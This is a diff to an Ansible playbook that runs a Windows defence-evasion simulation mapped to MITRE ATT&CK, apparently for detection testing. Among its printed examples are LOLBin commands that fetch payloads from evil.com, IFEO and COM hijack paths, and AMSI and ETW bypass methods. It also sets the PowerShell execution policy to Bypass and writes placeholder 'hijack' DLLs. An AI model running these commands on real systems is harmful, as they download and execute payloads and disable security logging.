@@ -10,198 +10,154 @@
         path: "{{ attack_log_dir }}"
         state: directory
 
+    - name: Set PowerShell Execution Policy
+      win_shell: Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
+      ignore_errors: yes
+
     - name: Execute Modern Evasion Chain
-      win_shell: |
-        Write-Host "[+] Starting modern evasion techniques simulation"
-        Write-Host "[+] MITRE ATT&CK: T1218, T1562.001, T1127.001, T1574.002, T1055.013"
-        Write-Host "[+] Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-        
-        $attackLogDir = "{{ attack_log_dir }}"
-        
-        # Test 1: Living off the Land Binaries (LOLBins)
-        Write-Host "`n=== Test 1: LOLBins Abuse ==="
-        
-        # MSBuild code execution
-        Write-Host "MSBuild.exe code execution simulation:"
-        $msbuildPaths = @(
-            "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\MSBuild.exe",
-            "${env:ProgramFiles}\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
-            "${env:ProgramFiles(x86)}\MSBuild\14.0\Bin\MSBuild.exe"
-        )
-        foreach ($path in $msbuildPaths) {
-            if (Test-Path $path) {
-                Write-Host "Found MSBuild: $path"
-                Write-Host "Command simulation: MSBuild.exe malicious.csproj"
-                break
-            }
-        }
-        
-        # RegSvr32 bypass techniques
-        Write-Host "`nRegSvr32 bypass simulation:"
-        Write-Host "regsvr32 /s /n /u /i:http://evil.com/script.sct scrobj.dll"
-        Write-Host "regsvr32 /s /n /u /i:javascript:alert('XSS') scrobj.dll"
-        
-        # CertUtil abuse
-        Write-Host "`nCertUtil abuse simulation:"
-        Write-Host "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe"
-        Write-Host "certutil -decode base64file.txt decoded.exe"
-        Write-Host "certutil -decodehex hexfile.txt decoded.exe"
-        
-        # BitsAdmin abuse
-        Write-Host "`nBitsAdmin download simulation:"
-        Write-Host "bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/payload.exe C:\temp\payload.exe"
-        
-        # Forfiles abuse
-        Write-Host "`nForfiles command execution:"
-        Write-Host "forfiles /p C:\windows\system32 /m notepad.exe /c calc.exe"
-        
-        # Test 2: DLL Hijacking Techniques
-        Write-Host "`n=== Test 2: DLL Hijacking Simulation ==="
-        
-        # DLL Search Order Hijacking
-        Write-Host "DLL Search Order Hijacking:"
-        $hijackableDlls = @("version.dll", "dwmapi.dll", "uxtheme.dll", "winmm.dll", "msvcr100.dll", "api-ms-win-core-libraryloader-l1-1-0.dll")
-        foreach ($dll in $hijackableDlls) {
-            Write-Host "Creating hijack DLL: $dll"
-            $fakeDllPath = "$attackLogDir\$dll"
-            try {
-                New-Item -Path $fakeDllPath -ItemType File -Force | Out-Null
-                Add-Content -Path $fakeDllPath -Value "// Fake DLL for hijacking simulation"
-                Write-Host "Created: $fakeDllPath"
-            } catch {
-                Write-Host "Could not create: $fakeDllPath - $_"
-            }
-        }
-        
-        # Phantom DLL Hijacking
-        Write-Host "`nPhantom DLL Hijacking simulation:"
-        Write-Host "Targeting non-existent DLLs loaded by legitimate processes"
-        Write-Host "Example: iertutil.dll, profapi.dll, xmllite.dll"
-        
-        # DLL Side-Loading
-        Write-Host "`nDLL Side-Loading simulation:"
-        Write-Host "Placing malicious DLL alongside legitimate signed binary"
-        Write-Host "Target: Legitimate software with DLL dependencies"
-        
-        # Test 3: COM Hijacking
-        Write-Host "`n=== Test 3: COM Hijacking Simulation ==="
-        Write-Host "COM object hijacking simulation:"
-        $comClsids = @(
-            "{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A}",
-            "{BCDE0395-E52F-467C-8E3D-C4579291692E}",
-            "{4590F811-1D3A-11D0-891F-00AA004B2E24}"
-        )
-        
+      win_command: >
+        powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "
+        Write-Host '[+] Starting modern evasion techniques simulation';
+        Write-Host '[+] MITRE ATT&CK: T1218, T1562.001, T1127.001, T1574.002, T1055.013';
+        Write-Host '[+] Time:' (Get-Date -Format 'yyyy-MM-dd HH:mm:ss');
+        $attackLogDir = 'C:\AttackSimulation\ModernEvasion';
+        Write-Host '';
+        Write-Host '=== Test 1: LOLBins Abuse ===';
+        Write-Host 'MSBuild.exe code execution simulation:';
+        Write-Host 'Command simulation: MSBuild.exe malicious.csproj';
+        Write-Host '';
+        Write-Host 'RegSvr32 bypass simulation:';
+        Write-Host 'regsvr32 /s /n /u /i:http://evil.com/script.sct scrobj.dll';
+        Write-Host 'regsvr32 /s /n /u /i:javascript:alert(XSS) scrobj.dll';
+        Write-Host '';
+        Write-Host 'CertUtil abuse simulation:';
+        Write-Host 'certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe';
+        Write-Host 'certutil -decode base64file.txt decoded.exe';
+        Write-Host 'certutil -decodehex hexfile.txt decoded.exe';
+        Write-Host '';
+        Write-Host 'BitsAdmin download simulation:';
+        Write-Host 'bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/payload.exe C:\temp\payload.exe';
+        Write-Host '';
+        Write-Host 'Forfiles command execution:';
+        Write-Host 'forfiles /p C:\windows\system32 /m notepad.exe /c calc.exe';
+        Write-Host '';
+        Write-Host '=== Test 2: DLL Hijacking Simulation ===';
+        Write-Host 'DLL Search Order Hijacking:';
+        $hijackableDlls = @('version.dll', 'dwmapi.dll', 'uxtheme.dll', 'winmm.dll', 'msvcr100.dll', 'api-ms-win-core-libraryloader-l1-1-0.dll');
+        foreach ($dll in $hijackableDlls) { 
+          Write-Host 'Creating hijack DLL:' $dll;
+          $fakeDllPath = \"$attackLogDir\$dll\";
+          try {
+            New-Item -Path $fakeDllPath -ItemType File -Force | Out-Null;
+            Add-Content -Path $fakeDllPath -Value '// Fake DLL for hijacking simulation';
+            Write-Host 'Created:' $fakeDllPath;
+          } catch {
+            Write-Host 'Could not create:' $fakeDllPath;
+          }
+        };
+        Write-Host '';
+        Write-Host 'Phantom DLL Hijacking simulation:';
+        Write-Host 'Targeting non-existent DLLs loaded by legitimate processes';
+        Write-Host 'Example: iertutil.dll, profapi.dll, xmllite.dll';
+        Write-Host '';
+        Write-Host 'DLL Side-Loading simulation:';
+        Write-Host 'Placing malicious DLL alongside legitimate signed binary';
+        Write-Host 'Target: Legitimate software with DLL dependencies';
+        Write-Host '';
+        Write-Host '=== Test 3: COM Hijacking Simulation ===';
+        Write-Host 'COM object hijacking simulation:';
+        $comClsids = @('{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A}', '{BCDE0395-E52F-467C-8E3D-C4579291692E}', '{4590F811-1D3A-11D0-891F-00AA004B2E24}');
         foreach ($clsid in $comClsids) {
-            Write-Host "Simulating COM hijack for CLSID: $clsid"
-            Write-Host "Registry path: HKCU\Software\Classes\CLSID\$clsid\InprocServer32"
-        }
-        
-        # Test 4: Image File Execution Options (IFEO)
-        Write-Host "`n=== Test 4: IFEO Hijacking Simulation ==="
-        Write-Host "Image File Execution Options abuse:"
-        $targetProcesses = @("notepad.exe", "calc.exe", "mspaint.exe")
+          Write-Host 'Simulating COM hijack for CLSID:' $clsid;
+          Write-Host 'Registry path: HKCU\Software\Classes\CLSID\' $clsid '\InprocServer32';
+        };
+        Write-Host '';
+        Write-Host '=== Test 4: IFEO Hijacking Simulation ===';
+        Write-Host 'Image File Execution Options abuse:';
+        $targetProcesses = @('notepad.exe', 'calc.exe', 'mspaint.exe');
         foreach ($process in $targetProcesses) {
-            Write-Host "IFEO hijack simulation for: $process"
-            Write-Host "Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$process"
-            Write-Host "Debugger value: cmd.exe /c malicious_command.exe"
-        }
-        
-        # Test 5: Advanced PowerShell Evasion
-        Write-Host "`n=== Test 5: PowerShell Evasion Techniques ==="
-        
-        # AMSI Bypass methods
-        Write-Host "AMSI Bypass techniques:"
-        Write-Host "Method 1: amsiInitFailed flag manipulation"
-        Write-Host "Method 2: Memory patching"
-        Write-Host "Method 3: COM object abuse"
-        
-        # Script Block Logging Bypass
-        Write-Host "`nScript Block Logging evasion:"
-        Write-Host "Registry manipulation: HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
-        Write-Host "GPO bypass techniques"
-        
-        # Execution Policy Bypass
-        Write-Host "`nExecution Policy bypass:"
-        Write-Host "powershell.exe -ExecutionPolicy Bypass -File malicious.ps1"
-        Write-Host "powershell.exe -ep bypass -enc <base64_encoded_command>"
-        
-        # Test 6: Process Injection Variations
-        Write-Host "`n=== Test 6: Advanced Process Injection ==="
-        
-        # Process Doppelgänging
-        Write-Host "Process Doppelgänging simulation:"
-        Write-Host "NtCreateTransaction + CreateFileTransacted + NtCreateProcessEx"
-        Write-Host "Transactional NTFS abuse for process creation"
-        
-        # Process Herpaderping
-        Write-Host "`nProcess Herpaderping simulation:"
-        Write-Host "CreateFile + WriteFile + CreateProcess + File modification"
-        Write-Host "Post-creation file content modification"
-        
-        # Atom Bombing
-        Write-Host "`nAtom Bombing simulation:"
-        Write-Host "GlobalAddAtom + SetWindowLong injection technique"
-        Write-Host "Atom table abuse for code injection"
-        
-        # Manual DLL Mapping
-        Write-Host "`nManual DLL Mapping:"
-        Write-Host "Custom PE loader bypassing LoadLibrary"
-        Write-Host "Direct memory manipulation for DLL loading"
-        
-        # Test 7: Signed Binary Proxy Execution
-        Write-Host "`n=== Test 7: Signed Binary Abuse ==="
-        
+          Write-Host 'IFEO hijack simulation for:' $process;
+          Write-Host 'Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' $process;
+          Write-Host 'Debugger value: cmd.exe /c malicious_command.exe';
+        };
+        Write-Host '';
+        Write-Host '=== Test 5: PowerShell Evasion Techniques ===';
+        Write-Host 'AMSI Bypass techniques:';
+        Write-Host 'Method 1: amsiInitFailed flag manipulation';
+        Write-Host 'Method 2: Memory patching via WriteProcessMemory';
+        Write-Host 'Method 3: COM object instantiation bypass';
+        Write-Host '';
+        Write-Host 'Script Block Logging evasion:';
+        Write-Host 'Registry manipulation: HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging';
+        Write-Host 'GPO bypass techniques';
+        Write-Host '';
+        Write-Host 'Execution Policy bypass:';
+        Write-Host 'powershell.exe -ExecutionPolicy Bypass -File malicious.ps1';
+        Write-Host 'powershell.exe -ep bypass -enc base64_encoded_command';
+        Write-Host '';
+        Write-Host '=== Test 6: Advanced Process Injection ===';
+        Write-Host 'Process Doppelgänging simulation:';
+        Write-Host 'NtCreateTransaction + CreateFileTransacted + NtCreateProcessEx';
+        Write-Host 'Transactional NTFS abuse for process creation';
+        Write-Host '';
+        Write-Host 'Process Herpaderping simulation:';
+        Write-Host 'CreateFile + WriteFile + CreateProcess + File modification';
+        Write-Host 'Post-creation file content modification';
+        Write-Host '';
+        Write-Host 'Atom Bombing simulation:';
+        Write-Host 'GlobalAddAtom + SetWindowLong injection technique';
+        Write-Host 'Atom table abuse for code injection';
+        Write-Host '';
+        Write-Host 'Manual DLL Mapping:';
+        Write-Host 'Custom PE loader bypassing LoadLibrary';
+        Write-Host 'Direct memory manipulation for DLL loading';
+        Write-Host '';
+        Write-Host '=== Test 7: Signed Binary Abuse ===';
         $signedBinaries = @(
-            @{Name="InstallUtil.exe"; Command="/logfile= /LogToConsole=false /U malicious.dll"},
-            @{Name="RegAsm.exe"; Command="/U malicious.dll /codebase"},
-            @{Name="MSBuild.exe"; Command="malicious.csproj"},
-            @{Name="csc.exe"; Command="/out:malicious.exe /target:exe payload.cs"},
-            @{Name="AppLaunch.exe"; Command="C:\Windows\System32\notepad.exe C:\temp\malicious.txt"},
-            @{Name="Bginfo.exe"; Command="bginfo.bgi /timer:0 /nolicprompt"}
-        )
-        
+          @{Name='InstallUtil.exe'; Command='/logfile= /LogToConsole=false /U malicious.dll'},
+          @{Name='RegAsm.exe'; Command='/U malicious.dll /codebase'},
+          @{Name='MSBuild.exe'; Command='malicious.csproj'},
+          @{Name='csc.exe'; Command='/out:malicious.exe /target:exe payload.cs'},
+          @{Name='AppLaunch.exe'; Command='C:\Windows\System32\notepad.exe C:\temp\malicious.txt'},
+          @{Name='Bginfo.exe'; Command='bginfo.bgi /timer:0 /nolicprompt'}
+        );
         foreach ($binary in $signedBinaries) {
-            Write-Host "Signed binary abuse: $($binary.Name)"
-            Write-Host "Command: $($binary.Name) $($binary.Command)"
-        }
-        
-        # Test 8: ETW Bypass Techniques
-        Write-Host "`n=== Test 8: ETW Bypass Simulation ==="
-        Write-Host "ETW Provider manipulation:"
-        Write-Host "Microsoft-Windows-PowerShell provider disable"
-        Write-Host "EtwEventWrite API hooking simulation"
-        Write-Host "ETW registration tampering"
-        Write-Host "Microsoft-Windows-Kernel-Process provider disable"
-        
-        # Save comprehensive results
+          Write-Host 'Signed binary abuse:' $binary.Name;
+          Write-Host 'Command:' $binary.Name $binary.Command;
+        };
+        Write-Host '';
+        Write-Host '=== Test 8: ETW Bypass Simulation ===';
+        Write-Host 'ETW Provider manipulation:';
+        Write-Host 'Microsoft-Windows-PowerShell provider disable';
+        Write-Host 'EtwEventWrite API hooking simulation';
+        Write-Host 'ETW registration tampering';
+        Write-Host 'Microsoft-Windows-Kernel-Process provider disable';
+        Write-Host '';
         $results = @{
-            "TestTimestamp" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-            "LOLBinsAbused" = @("MSBuild", "RegSvr32", "CertUtil", "BitsAdmin", "Forfiles")
-            "DLLHijackingTypes" = @("Search Order", "Phantom", "Side-Loading")
-            "DLLsCreated" = $hijackableDlls
-            "COMHijacking" = $comClsids
-            "IFEOTargets" = $targetProcesses
-            "AMSIBypassMethods" = @("amsiInitFailed", "Memory Patching", "COM Abuse")
-            "ProcessInjection" = @("Doppelgänging", "Herpaderping", "Atom Bombing", "Manual DLL Mapping")
-            "SignedBinaryAbuse" = ($signedBinaries | ForEach-Object { $_.Name })
-            "ETWBypass" = $true
-            "EvasionLevel" = "Advanced"
-            "ThreatComplexity" = "High"
-            "MITRETechniques" = @("T1218", "T1562.001", "T1127.001", "T1574.002", "T1055.013", "T1546.015")
-        }
-        
+          'TestTimestamp' = Get-Date -Format 'yyyy-MM-dd HH:mm:ss';
+          'LOLBinsAbused' = @('MSBuild', 'RegSvr32', 'CertUtil', 'BitsAdmin', 'Forfiles');
+          'DLLHijackingTypes' = @('Search Order', 'Phantom', 'Side-Loading');
+          'DLLsCreated' = $hijackableDlls;
+          'COMHijacking' = $comClsids;
+          'IFEOTargets' = $targetProcesses;
+          'AMSIBypassMethods' = @('amsiInitFailed', 'Memory Patching', 'COM Abuse');
+          'ProcessInjection' = @('Doppelgänging', 'Herpaderping', 'Atom Bombing', 'Manual DLL Mapping');
+          'SignedBinaryAbuse' = ($signedBinaries | ForEach-Object { $_.Name });
+          'ETWBypass' = $true;
+          'EvasionLevel' = 'Advanced';
+          'ThreatComplexity' = 'High';
+          'MITRETechniques' = @('T1218', 'T1562.001', 'T1127.001', 'T1574.002', 'T1055.013', 'T1546.015');
+        };
         try {
-            $results | ConvertTo-Json | Out-File "$attackLogDir\modern_evasion_results.json"
-            Write-Host "`n[+] Modern evasion simulation completed"
-            Write-Host "[+] Results saved to: $attackLogDir\modern_evasion_results.json"
-            Write-Host "[+] Created $($hijackableDlls.Count) hijack DLL artifacts"
-            Write-Host "[+] Simulated $($signedBinaries.Count) signed binary abuse techniques"
+          $results | ConvertTo-Json | Out-File \"$attackLogDir\modern_evasion_results.json\";
+          Write-Host '[+] Modern evasion simulation completed';
+          Write-Host '[+] Results saved to:' \"$attackLogDir\modern_evasion_results.json\";
+          Write-Host '[+] Created' $hijackableDlls.Count 'hijack DLL artifacts';
+          Write-Host '[+] Simulated' $signedBinaries.Count 'signed binary abuse techniques';
         } catch {
-            Write-Host "Error saving results: $_"
+          Write-Host 'Error saving results:' $_;
         }
-      args:
-        executable: powershell.exe
+        "
       register: evasion_results
       ignore_errors: yes
 
